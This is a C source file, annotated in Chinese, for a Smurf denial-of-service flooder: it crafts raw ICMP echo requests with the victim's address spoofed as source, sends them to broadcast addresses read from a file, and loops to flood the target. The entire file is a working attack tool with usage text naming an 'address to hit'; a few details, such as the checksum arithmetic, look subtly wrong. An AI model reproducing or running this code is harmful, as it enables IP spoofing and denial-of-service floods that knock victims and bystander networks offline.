#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netdb.h>
#include <ctype.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h> 

void banner(void);
void usage(char *);
void smurf(int, struct sockaddr_in, u_long, int);
void ctrlc(int);
unsigned short in_chksum(u_short *, int);
/*
	smurf攻击的思想：
	Smurf攻击通过使用将回复地址设置成受害网络的广播地址的ICMP应答请求(ping)数据包，来淹没受害主机，
	最终导致该网络的所有主机都对此ICMP应答请求做出答复，导致网络阻塞。更加复杂的Smurf将源地址改为第三方的受害者，最终导致第三方崩溃。
	
	通俗讲，程序是这样做的，伪造一个广播包，ICMP报文，然后这个包得原地址设置为目标主机的ip，广播地址设置为同一个网络的别的主机，然后将
	这个包发出去，就成了这种效果，目标主机向同那些广播主机进行广播，然后其他主机都会对回复，这样目标主机就会收到大量回复，导致网络瘫痪。
	
	所以程序设计过程就是伪造一个广播包，元地址设为目标地址，广播地址随意（同网络就行），然后发包出去，（就不是直接发包给目标主机，
	而是伪装成目标主机进行发广播包，这样目标主机就收到大量的回复了）
*/

int main (int argc, char *argv[])
{
   struct sockaddr_in sin;  //sockect地址结构体
   struct hostent *he;     //主机信息结构体
   FILE   *bcastfile;     // 广播文件 存储ip列表
   int    i, sock, bcast, delay, num, pktsize, cycle = 0, x;  // 中间参数 
   char   buf[32], **bcastaddr = malloc(8192);   // 数据缓存 广播网文件的地址缓存

   signal(SIGINT, ctrlc);  // 接受中断信息linux语法

   if (argc < 6) usage(argv[0]);  // 使用方法

   // 目标ip是否有效 
   if ((he = gethostbyname(argv[1])) == NULL) {
      perror("resolving source host");
      exit(-1);
   }
   
   // 将目标主机信息初始化到socket中
   memcpy((caddr_t)&sin.sin_addr, he->h_addr, he->h_length);
   sin.sin_family = AF_INET;  //地址家族 AF_INET,代表TCP/IP协议族  
   sin.sin_port = htons(0);  //端口号

   num = atoi(argv[3]);　　　　//报数量
   delay = atoi(argv[4]);      // 包延迟
   pktsize = atoi(argv[5]);   // 包大小

   // 打开广播文件
   if ((bcastfile = fopen(argv[2], "r")) == NULL) {
      perror("opening bcast file");
      exit(-1);
   }
   x = 0;
   // 循环读取广播文件
   while (!feof(bcastfile)) {
      fgets(buf, 32, bcastfile);  // 读取一行
      if (buf[0] == '#' || buf[0] == '\n' || ! isdigit(buf[0])) continue;
      for (i = 0; i < strlen(buf); i++)  // 行处理
          if (buf[i] == '\n') buf[i] = '\0';
      bcastaddr[x] = malloc(32); // 分配空间
      strcpy(bcastaddr[x], buf); // 缓存p地址
      x++;
   }
   // 最后一个广播地址初始化为空0
   bcastaddr[x] = 0x0;
   fclose(bcastfile);  // 关闭广播文件

   // 如果广播地址为空 提示
   if (x == 0) {
      fprintf(stderr, "ERROR: no broadcasts found in file %s\n\n", argv[2]);
      exit(-1);
   }
   // 包大小不能炒股1024
   if (pktsize > 1024) {
      fprintf(stderr, "ERROR: packet size must be < 1024\n\n");
      exit(-1);
   }

   //产生一个raw 套接字 原始套接字 标识为sock
   if ((sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
      perror("getting socket");
      exit(-1);
   }
   // 设置套接字选项 这里设置广播
   setsockopt(sock, SOL_SOCKET, SO_BROADCAST, (char *)&bcast, sizeof(bcast));

   //提示目标主机
   printf("Flooding %s (. = 25 outgoing packets)\n", argv[1]);
	
	// 循环发包了
   for (i = 0; i < num || !num; i++) {
      if (!(i % 25)) { printf("."); fflush(stdout); }  // 25次清屏一次
	  // 对广播地址循环进行smuf攻击
      smurf(sock, sin, inet_addr(bcastaddr[cycle]), pktsize);  // smurf攻击
      printf("packet %d\n",i);
      cycle++;
	  // 最后一个广播ip则回到第一个
      if (bcastaddr[cycle] == 0x0) cycle = 0;
      usleep(delay);  // 延迟一下下
   }
   puts("\n");
   return 0;
}

// 程序使用方法
void usage (char *prog)
{
   fprintf(stderr, "usage: %s   "
                   "  \n\n"
                   "target        = address to hit\n"
                   "bcast file    = file to read broadcast addresses from\n"
                   "num packets   = number of packets to send (0 = flood)\n"
                   "packet delay  = wait between each packet (in ms)\n"
                   "packet size   = size of packet (< 1024)\n\n", prog);
   exit(-1);
}


// smurf攻击
void smurf (int sock, struct sockaddr_in sin, u_long dest, int psize)
{
   struct iphdr *ip;   // ip报文
   struct icmphdr *icmp;  // icmp报文
   char *packet;
  　//开辟包空间　包括ip头　icmp头　数据包大小
   packet = malloc(sizeof(struct iphdr) + sizeof(struct icmphdr) + psize);
   ip = (struct iphdr *)packet;  //ip头初始化地址
   icmp = (struct icmphdr *) (packet + sizeof(struct iphdr)); //icmp头初始化地址

   // 头部先清0
   memset(packet, 0, sizeof(struct iphdr) + sizeof(struct icmphdr) + psize);
	//ip包初始化
   ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct icmphdr) + psize); // 包总长度
   ip->ihl = 5;    // 首部长度
   ip->version = 4; // ipv4协议
   ip->ttl = 255; // 包的生命周期
   ip->tos = 0;	//服务类型字段 最小时延、最大吞吐量、最高可靠性和最小费用等
   ip->frag_off = 0;  // 分段偏移
   ip->protocol = IPPROTO_ICMP;   //报文类型  icmp类型
   ip->saddr = sin.sin_addr.s_addr;  //源地址为目标地址
   ip->daddr = dest;		// 目标地址为广播地址
   ip->check = in_chksum((u_short *)ip, sizeof(struct iphdr));  //ip头部校验和
   icmp->type = 8;    //icmp报文的类型  8为应答
   icmp->code = 0;	//代码０
   icmp->checksum = in_chksum((u_short *)icmp, sizeof(struct icmphdr) + psize);　　//icmp校验和
	
   // 发送数据库出去
   sendto(sock, packet, sizeof(struct iphdr) + sizeof(struct icmphdr) + psize,
          0, (struct sockaddr *)&sin, sizeof(struct sockaddr));

   free(packet);           /* free willy! */
}

// 中断信号输出 退出程序
void ctrlc (int ignored)
{
   puts("\nDone!\n");
   exit(1);
}

// 计算校验和
unsigned short in_chksum (u_short *addr, int len)
{
   register int nleft = len;
   register int sum = 0;
   u_short answer = 0;

   while (nleft > 1) {
      sum += *addr++;
      nleft -= 2;
   }

   if (nleft == 1) {
      *(u_char *)(&answer) = *(u_char *)addr;
      sum += answer;
   }

   sum = (sum >> 16) + (sum + 0xffff);
   sum += (sum >> 16);
   answer = ~sum;
   return(answer);
}
